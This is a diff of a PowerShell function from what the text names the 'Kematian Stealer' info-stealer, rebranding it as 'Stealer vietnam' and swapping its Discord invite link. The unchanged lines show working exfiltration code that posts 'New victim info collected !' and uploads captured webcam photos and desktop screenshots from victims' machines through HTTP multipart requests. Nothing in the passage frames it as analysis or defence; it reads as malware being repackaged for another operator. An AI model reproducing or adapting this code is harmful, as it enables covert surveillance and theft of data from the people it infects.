@@ -1247,13 +1247,13 @@ function Backup-Data {
 
     Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
     $embed_and_body = @{
-        "username"   = "Kematian"
+        "username"   = "Stealer vietnam"
         "color"      = "15105570"
-        "avatar_url" = "https://i.imgur.com/6w6qWCB.jpeg"
-        "url"        = "https://discord.com/invite/WJCNUpxnrE"
+        "avatar_url" = "$avatar"
+        "url"        = "https://discord.gg/KTTnjy2E"
         "embeds"     = @(
             @{
-                "title"       = "Kematian Stealer"
+                "title"       = "Stealer vietnam"
                 "url"         = "https://github.com/adasdasdsaf/Kematian-Stealer"
                 "description" = "New victim info collected !"
                 "color"       = "15105570"
@@ -1307,7 +1307,7 @@ function Backup-Data {
     $jpegfiles = Get-ChildItem -Path $folder_general -Filter out*.jpg
     foreach ($jpegfile in $jpegfiles) {
         $name = $jpegfile.Name
-        $messageContent = @{content = "## :camera: Webcam" ; username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json; $httpClient = [Net.Http.HttpClient]::new()
+        $messageContent = @{content = "## :camera: Webcam" ; username = "Stealer vietnam" ; avatar_url = $avatar } | ConvertTo-Json; $httpClient = [Net.Http.HttpClient]::new()
         $multipartContent = [Net.Http.MultipartFormDataContent]::new()
         $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent); $messageContentStream = [IO.MemoryStream]::new()
         $messageContentStream.Write($messageBytes, 0, $messageBytes.Length); $messageContentStream.Position = 0; $streamContent = [Net.Http.StreamContent]::new($messageContentStream)
@@ -1318,7 +1318,7 @@ function Backup-Data {
     }
 
     # Send screenshot
-    $messageContent = @{content = "## :desktop: Screenshot"; username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json
+    $messageContent = @{content = "## :desktop: Screenshot"; username = "Stealer vietnam" ; avatar_url = $avatar } | ConvertTo-Json
     $httpClient = [Net.Http.HttpClient]::new(); $multipartContent = [Net.Http.MultipartFormDataContent]::new()
     $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent); $messageContentStream = [IO.MemoryStream]::new()
     $messageContentStream.Write($messageBytes, 0, $messageBytes.Length); $messageContentStream.Position = 0
